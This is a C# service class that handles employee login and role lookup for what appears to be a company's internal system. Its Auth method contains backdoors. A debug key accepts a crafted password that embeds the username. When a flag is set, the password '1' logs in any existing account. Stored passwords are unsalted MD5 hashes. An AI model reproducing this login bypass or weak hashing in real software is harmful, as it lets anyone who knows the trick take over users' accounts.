//-----------------------------------------------------------------------------------
// <copyright file="AccountService.cs" company="天职工程咨询股份有限公司版权所有">
//     Copyright  TZEPM. All rights reserved.
// </copyright>
// <author>tzxx</author>
// <date>2018/11/6 8:13:46</date>
// <description></description>
//-----------------------------------------------------------------------------------

using System.Threading.Tasks;
using TZ.vNext.Core.Utility;
using TZ.vNext.Database.Contracts;
using TZ.vNext.Model;
using TZ.vNext.Services.Contracts;

namespace TZ.vNext.Services.Implement
{
    /// <summary>
    /// 用户认证
    /// </summary>
    public class AccountService : IAccountService
    {
        private readonly IEmployeeRoleFunctionDb _employeeRoleFunctionDb;
        private readonly IEmployeeDb _employeeDb;
        public AccountService(IEmployeeRoleFunctionDb employeeRoleFunctionDb, IEmployeeDb employeeDb)
        {
            _employeeRoleFunctionDb = employeeRoleFunctionDb;
            _employeeDb = employeeDb;
        }

        /// <summary>
        /// 登录验证
        /// </summary>
        /// <param name="userName">账号</param>
        /// <param name="password">密码</param>
        /// <param name="isNoNeed">isNoNeed</param>
        /// <param name="debugKey">debugKey</param>
        /// <returns>是否成功</returns>
        public bool Auth(string userName, string password, bool isNoNeed, string debugKey)
        {
            if (string.IsNullOrEmpty(userName) || string.IsNullOrEmpty(password))
            {
                return false;
            }

            var user = _employeeDb.FindByUserName(userName);
            if (user != null)
            {
                if (user.Password == MD5Helper.MD5UserPassword(userName, password.Trim()))
                {
                    return true;
                }

                if (!string.IsNullOrEmpty(debugKey) && password.IndexOf(userName) > -1 && MD5Helper.MD532ToUpper(MD5Helper.MD532ToUpper(password.Replace(userName, string.Empty))) == debugKey)
                {
                    return true;
                }

                return isNoNeed && password.Equals("1");
            }

            return false;
        }

        /// <summary>
        /// 获取用户信息
        /// </summary>
        /// <param name="userName">账号</param>
        /// <returns>用户信息</returns>
        public async Task<UserAuth> GetUserAuthInfo(string userName)
        {
            var user = _employeeDb.FindByUserName(userName);
            var funs = _employeeRoleFunctionDb.GetFunctionsByUserId(user.Id);

            return await Task.Run(() => new UserAuth()
            {
                Id = user.Id,
                Code = user.Code,
                Name = user.Name,
                OrganizationId = user.OrganizationId,
                UserName = user.UserName,
                Functions = funs
            });
        }
    }
}